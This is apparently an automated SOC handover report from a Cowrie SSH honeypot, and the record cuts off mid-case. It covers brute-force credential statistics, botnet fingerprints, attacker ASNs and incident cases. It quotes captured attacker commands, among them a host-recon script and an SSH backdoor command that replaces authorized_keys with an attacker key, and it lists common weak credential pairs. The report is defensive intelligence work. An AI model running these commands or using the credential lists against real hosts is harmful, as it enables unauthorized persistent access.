# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-08 |
| **Generated At** | 2026-07-08T19:39:20Z |
| **Shift Time** | 19:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **205** |
| Confirmed Threats | **194** |
| False Positives Filtered | **11** (5.4%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **20** |
| High Severity Cases | **127** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **170** |
| Unique Credential Pairs | **113** |
| Unique Usernames | **30** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **154** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `support` | 20 |
| `mongodb` | 9 |
| `apache` | 9 |
| `nginx` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `123456` | 7 |
| `password` | 6 |
| `123456789` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `guest` | `abcd1234` | 6 |
| `support` | `Support123` | 5 |
| `supervisor` | `444` | 4 |
| `root` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `111.9.42.6` | 2026-07-08T16:55:07 |
| `mongodb` | `123456` | `91.92.40.176` | 2026-07-08T16:56:15 |
| `root` | `Pass@123` | `45.198.224.120` | 2026-07-08T16:56:56 |
| `weblogic` | `weblogic` | `10.0.0.73` | 2026-07-08T16:57:23 |
| `mongodb` | `password` | `91.92.40.176` | 2026-07-08T16:58:38 |
| `mongodb` | `123456789` | `91.92.40.176` | 2026-07-08T17:01:01 |
| `mongodb` | `12345` | `91.92.40.176` | 2026-07-08T17:03:22 |
| `deploy` | `123456` | `115.190.126.68` | 2026-07-08T17:04:31 |
| `345gs5662d34` | `345gs5662d34` | `115.190.126.68` | 2026-07-08T17:04:41 |
| `deploy` | `3245gs5662d34` | `115.190.126.68` | 2026-07-08T17:04:47 |
| `mongodb` | `12345678` | `91.92.40.176` | 2026-07-08T17:05:45 |
| `mongodb` | `qwerty` | `91.92.40.176` | 2026-07-08T17:08:05 |
| `mongodb` | `123123` | `91.92.40.176` | 2026-07-08T17:10:29 |
| `mongodb` | `111111` | `91.92.40.176` | 2026-07-08T17:12:48 |
| `root` | `Fx@12345` | `10.0.0.73` | 2026-07-08T17:13:55 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-08T17:13:59 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T17:14:00 |
| `ec2-user` | `1234` | `10.0.0.73` | 2026-07-08T17:14:31 |
| `ec2-user` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T17:14:36 |
| `root` | `Admin@123` | `45.198.224.114` | 2026-07-08T17:15:00 |
| `mongodb` | `1234567` | `91.92.40.176` | 2026-07-08T17:15:06 |
| `blank` | `blank33` | `178.178.194.151` | 2026-07-08T17:15:10 |
| `blank` | `blank33` | `117.252.93.114` | 2026-07-08T17:15:22 |
| `root` | `pass` | `45.198.224.120` | 2026-07-08T17:15:44 |
| `centos` | `centos12` | `118.45.113.140` | 2026-07-08T17:17:02 |
| `centos` | `centos12` | `117.247.239.202` | 2026-07-08T17:17:11 |
| `apache` | `123456` | `91.92.40.176` | 2026-07-08T17:17:26 |
| `supervisor` | `444` | `180.117.39.49` | 2026-07-08T17:17:33 |
| `supervisor` | `444` | `172.90.128.97` | 2026-07-08T17:17:43 |
| `jenkins` | `admin` | `10.0.0.73` | 2026-07-08T17:18:52 |
| `jenkins` | `3245gs5662d34` | `10.0.0.73` | 2026-07-08T17:18:57 |
| `apache` | `password` | `91.92.40.176` | 2026-07-08T17:19:47 |
| `supervisor` | `444` | `10.0.0.73` | 2026-07-08T17:21:14 |
| `supervisor` | `passwd` | `96.1.40.151` | 2026-07-08T17:21:55 |
| `apache` | `123456789` | `91.92.40.176` | 2026-07-08T17:22:13 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-08T17:22:19 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-08T17:22:20 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-08T17:22:29 |
| `ubuntu` | `zaq12wsxcde3` | `185.242.3.195` | 2026-07-08T17:23:08 |
| `apache` | `12345` | `91.92.40.176` | 2026-07-08T17:24:35 |
| `root` | `rootroot` | `45.198.224.114` | 2026-07-08T17:25:45 |
| `ubuntu` | `zaq12wsxcde3` | `10.0.0.73` | 2026-07-08T17:26:53 |
| `apache` | `12345678` | `91.92.40.176` | 2026-07-08T17:26:56 |
| `apache` | `qwerty` | `91.92.40.176` | 2026-07-08T17:29:13 |
| `root` | `1q2w3e4r!` | `10.0.0.73` | 2026-07-08T17:29:27 |
| `admin` | `welcome@123` | `103.187.146.90` | 2026-07-08T17:30:57 |
| `345gs5662d34` | `345gs5662d34` | `103.187.146.90` | 2026-07-08T17:31:01 |
| `admin` | `3245gs5662d34` | `103.187.146.90` | 2026-07-08T17:31:03 |
| `apache` | `123123` | `91.92.40.176` | 2026-07-08T17:31:29 |
| `ubuntu` | `Admin!@#` | `45.198.224.120` | 2026-07-08T17:32:10 |
| `apache` | `111111` | `91.92.40.176` | 2026-07-08T17:33:43 |
| `apache` | `1234567` | `91.92.40.176` | 2026-07-08T17:36:03 |
| `nginx` | `123456` | `91.92.40.176` | 2026-07-08T17:38:30 |
| `unknown` | `unknown77` | `217.150.37.249` | 2026-07-08T17:39:12 |
| `cstrike` | `cstrike` | `10.0.0.73` | 2026-07-08T17:40:05 |
| `support` | `789456123` | `94.228.240.2` | 2026-07-08T17:40:45 |
| `support` | `789456123` | `196.189.126.185` | 2026-07-08T17:40:52 |
| `nginx` | `password` | `91.92.40.176` | 2026-07-08T17:41:00 |
| `root` | `Q1w2e3r4` | `45.198.224.120` | 2026-07-08T17:41:13 |
| `guest` | `abcd1234` | `111.171.127.190` | 2026-07-08T17:42:35 |
| `guest` | `abcd1234` | `14.49.178.90` | 2026-07-08T17:42:50 |
| `unknown` | `unknown77` | `10.0.0.73` | 2026-07-08T17:42:58 |
| `nginx` | `123456789` | `91.92.40.176` | 2026-07-08T17:43:25 |
| `root` | `Abc123` | `65.20.131.63` | 2026-07-08T17:44:26 |
| `support` | `789456123` | `50.217.40.11` | 2026-07-08T17:44:28 |
| `root` | `Abc123` | `111.70.11.38` | 2026-07-08T17:44:35 |
| `support` | `789456123` | `122.187.147.13` | 2026-07-08T17:44:37 |
| `nginx` | `12345` | `91.92.40.176` | 2026-07-08T17:45:49 |
| `guest` | `abcd1234` | `175.195.205.236` | 2026-07-08T17:46:16 |
| `guest` | `abcd1234` | `178.178.194.128` | 2026-07-08T17:46:25 |
| `guest` | `abcd1234` | `10.0.0.73` | 2026-07-08T17:46:39 |
| `cstrike` | `cstrike` | `45.198.224.114` | 2026-07-08T17:47:26 |
| `support` | `support` | `176.53.159.196` | 2026-07-08T17:47:43 |
| `root` | `Abc123` | `121.178.185.141` | 2026-07-08T17:47:54 |
| `nginx` | `12345678` | `91.92.40.176` | 2026-07-08T17:48:17 |
| `support` | `support` | `10.0.0.73` | 2026-07-08T17:49:02 |
| `root` | `qishang2016.com` | `45.198.224.120` | 2026-07-08T17:49:38 |
| `nginx` | `qwerty` | `91.92.40.176` | 2026-07-08T17:50:40 |
| `manders` | `manders` | `10.0.0.73` | 2026-07-08T17:51:07 |
| `nginx` | `123123` | `91.92.40.176` | 2026-07-08T17:53:06 |
| `nginx` | `111111` | `91.92.40.176` | 2026-07-08T17:55:32 |
| `root` | `QDwkidc!@#456` | `45.198.224.120` | 2026-07-08T17:57:52 |
| `nginx` | `1234567` | `91.92.40.176` | 2026-07-08T17:57:59 |
| `manders` | `manders` | `45.198.224.114` | 2026-07-08T17:58:01 |
| `root` | `sugondcu2@123` | `2.58.172.185` | 2026-07-08T17:58:55 |
| `operator` | `123456` | `91.92.40.176` | 2026-07-08T18:00:31 |
| `anto` | `anto` | `10.0.0.73` | 2026-07-08T18:01:45 |
| `operator` | `password` | `91.92.40.176` | 2026-07-08T18:03:00 |
| `operator` | `123456789` | `91.92.40.176` | 2026-07-08T18:05:30 |
| `operator` | `12345` | `91.92.40.176` | 2026-07-08T18:07:54 |
| `root` | `Pass123` | `45.198.224.120` | 2026-07-08T18:07:59 |
| `support` | `Support123` | `65.20.134.97` | 2026-07-08T18:08:28 |
| `default` | `raspberry` | `60.223.245.120` | 2026-07-08T18:08:38 |
| `support` | `Support123` | `223.82.97.51` | 2026-07-08T18:08:44 |
| `default` | `raspberry` | `50.217.40.11` | 2026-07-08T18:08:50 |
| `default` | `raspberry` | `10.0.0.73` | 2026-07-08T18:08:55 |
| `a` | `a` | `10.0.0.73` | 2026-07-08T18:09:22 |
| `operator` | `12345678` | `91.92.40.176` | 2026-07-08T18:10:18 |
| `support` | `support2022` | `220.246.42.227` | 2026-07-08T18:10:20 |
| `support` | `support7` | `10.0.0.73` | 2026-07-08T18:10:38 |
| `support` | `Support123` | `153.37.177.219` | 2026-07-08T18:11:55 |
| `support` | `Support123` | `65.20.250.244` | 2026-07-08T18:12:07 |
| `support` | `Support123` | `10.0.0.73` | 2026-07-08T18:12:12 |
| `redsocks` | `redsocks` | `10.0.0.73` | 2026-07-08T18:12:25 |
| `operator` | `qwerty` | `91.92.40.176` | 2026-07-08T18:12:44 |
| `support` | `support2022` | `65.20.158.10` | 2026-07-08T18:13:59 |
| `support` | `support2022` | `114.30.223.119` | 2026-07-08T18:14:08 |
| `support` | `support2022` | `10.0.0.73` | 2026-07-08T18:14:24 |
| `operator` | `123123` | `91.92.40.176` | 2026-07-08T18:15:13 |
| `operator` | `111111` | `91.92.40.176` | 2026-07-08T18:17:43 |
| `root` | `qazwsxlinux` | `185.242.3.195` | 2026-07-08T18:18:30 |
| `redsocks` | `redsocks` | `45.198.224.114` | 2026-07-08T18:19:16 |
| `operator` | `1234567` | `91.92.40.176` | 2026-07-08T18:20:14 |
| `developer` | `123456` | `91.92.40.176` | 2026-07-08T18:22:42 |
| `root` | `!@#` | `10.0.0.73` | 2026-07-08T18:22:59 |
| `ubuntu` | `Pass1234` | `45.198.224.120` | 2026-07-08T18:24:45 |
| `developer` | `password` | `91.92.40.176` | 2026-07-08T18:25:15 |
| `developer` | `123456789` | `91.92.40.176` | 2026-07-08T18:27:47 |
| `root` | `CactiEZ` | `43.134.230.165` | 2026-07-08T18:29:03 |
| `345gs5662d34` | `345gs5662d34` | `43.134.230.165` | 2026-07-08T18:29:07 |
| `root` | `3245gs5662d34` | `43.134.230.165` | 2026-07-08T18:29:09 |
| `root` | `!@#` | `45.198.224.114` | 2026-07-08T18:29:53 |
| `developer` | `12345` | `91.92.40.176` | 2026-07-08T18:30:22 |
| `centos` | `centos55` | `65.20.237.191` | 2026-07-08T18:30:25 |
| `centos` | `centos55` | `45.182.5.98` | 2026-07-08T18:30:35 |
| `developer` | `12345678` | `91.92.40.176` | 2026-07-08T18:33:01 |
| `centos` | `centos55` | `10.0.0.73` | 2026-07-08T18:34:01 |
| `ubuntu` | `feiliuzhixiasanqianchi_Case@` | `45.198.224.120` | 2026-07-08T18:34:50 |
| `developer` | `qwerty` | `91.92.40.176` | 2026-07-08T18:35:29 |
| `Administrator` | `admin` | `10.0.0.73` | 2026-07-08T18:36:06 |
| `support` | `12341234` | `124.67.120.106` | 2026-07-08T18:36:37 |
| `developer` | `123123` | `91.92.40.176` | 2026-07-08T18:38:06 |
| `admin` | `Admin12345` | `10.0.0.73` | 2026-07-08T18:39:43 |
| `developer` | `111111` | `91.92.40.176` | 2026-07-08T18:40:40 |
| `intranet` | `intranet` | `45.198.224.114` | 2026-07-08T18:40:45 |
| `developer` | `1234567` | `91.92.40.176` | 2026-07-08T18:43:05 |
| `user` | `User@2026` | `172.96.182.111` | 2026-07-08T18:43:07 |
| `345gs5662d34` | `345gs5662d34` | `172.96.182.111` | 2026-07-08T18:43:09 |
| `user` | `3245gs5662d34` | `172.96.182.111` | 2026-07-08T18:43:09 |
| `root` | `com` | `45.198.224.120` | 2026-07-08T18:43:32 |
| `vector` | `vector` | `134.209.120.216` | 2026-07-08T18:43:56 |
| `345gs5662d34` | `345gs5662d34` | `134.209.120.216` | 2026-07-08T18:43:58 |
| `vector` | `3245gs5662d34` | `134.209.120.216` | 2026-07-08T18:43:58 |
| `hegelund` | `hegelund` | `10.0.0.73` | 2026-07-08T18:44:37 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-08T18:45:29 |
| `deploy` | `123456` | `91.92.40.176` | 2026-07-08T18:45:31 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-08T18:47:21 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-08T18:47:21 |
| `deploy` | `password` | `91.92.40.176` | 2026-07-08T18:47:55 |
| `deploy` | `123456789` | `91.92.40.176` | 2026-07-08T18:50:18 |
| `hegelund` | `hegelund` | `45.198.224.114` | 2026-07-08T18:51:30 |
| `root` | `PasswdNew` | `45.198.224.120` | 2026-07-08T18:52:13 |
| `deploy` | `12345` | `91.92.40.176` | 2026-07-08T18:52:39 |
| `deploy` | `12345678` | `91.92.40.176` | 2026-07-08T18:54:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **205** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 76 |
| OpenSSH | 31 |
| libssh | 20 |
| Paramiko (Python) | 6 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 50 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 31 | 30 |
| `16443846184e...` | Generic scanner | 22 | 4 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 50 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 31 | 30 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 4 | Generic scanner |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 50 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.187.146.90`, `115.190.126.68`, `172.96.182.111`, `134.209.120.216`, `43.134.230.165`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **44** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (127)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-89c087deae14

| Field | Detail |
|---|---|
| **Source IP** | `111.9.42[.]6` |
| **First Seen** | 2026-07-08 16:55 |
| **Last Seen** | 2026-07-08 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 16:55:07` | `cowrie.login.success` |
| `2026-07-08 16:55:07` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `111.9.42[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.9.42[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791522dfd036

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 16:56 |
| **Last Seen** | 2026-07-08 16:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 16:56:14` | `cowrie.session.connect` |
| `2026-07-08 16:56:14` | `cowrie.client.version` |
| `2026-07-08 16:56:14` | `cowrie.client.kex` |
| `2026-07-08 16:56:15` | `cowrie.login.success` |
| `2026-07-08 16:56:17` | `cowrie.session.params` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.success` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.command.input` |
| `2026-07-08 16:56:17` | `cowrie.log.closed` |
| `2026-07-08 16:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9369b823282a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 16:56 |
| **Last Seen** | 2026-07-08 16:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 16:56:50` | `cowrie.session.connect` |
| `2026-07-08 16:56:51` | `cowrie.client.version` |
| `2026-07-08 16:56:51` | `cowrie.client.kex` |
| `2026-07-08 16:56:56` | `cowrie.login.success` |
| `2026-07-08 16:56:59` | `cowrie.session.params` |
| `2026-07-08 16:56:59` | `cowrie.command.input` |
| `2026-07-08 16:57:01` | `cowrie.log.closed` |
| `2026-07-08 16:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20059eb3bde5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 16:58 |
| **Last Seen** | 2026-07-08 16:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 16:58:36` | `cowrie.session.connect` |
| `2026-07-08 16:58:37` | `cowrie.client.version` |
| `2026-07-08 16:58:37` | `cowrie.client.kex` |
| `2026-07-08 16:58:38` | `cowrie.login.success` |
| `2026-07-08 16:58:40` | `cowrie.session.params` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.success` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:40` | `cowrie.command.input` |
| `2026-07-08 16:58:41` | `cowrie.log.closed` |
| `2026-07-08 16:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66f26b6f225

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:00 |
| **Last Seen** | 2026-07-08 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:00:59` | `cowrie.session.connect` |
| `2026-07-08 17:00:59` | `cowrie.client.version` |
| `2026-07-08 17:00:59` | `cowrie.client.kex` |
| `2026-07-08 17:01:01` | `cowrie.login.success` |
| `2026-07-08 17:01:02` | `cowrie.session.params` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.success` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.command.input` |
| `2026-07-08 17:01:02` | `cowrie.log.closed` |
| `2026-07-08 17:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7bc30ad0b44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:03 |
| **Last Seen** | 2026-07-08 17:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:03:20` | `cowrie.session.connect` |
| `2026-07-08 17:03:21` | `cowrie.client.version` |
| `2026-07-08 17:03:21` | `cowrie.client.kex` |
| `2026-07-08 17:03:22` | `cowrie.login.success` |
| `2026-07-08 17:03:24` | `cowrie.session.params` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
